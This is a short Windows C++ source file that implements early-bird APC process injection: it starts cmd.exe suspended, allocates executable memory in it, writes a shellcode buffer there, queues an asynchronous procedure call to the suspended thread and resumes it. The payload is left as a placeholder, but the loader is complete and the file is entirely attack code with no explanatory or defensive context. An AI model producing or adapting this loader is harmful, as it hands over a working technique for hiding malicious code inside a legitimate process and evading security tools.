#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
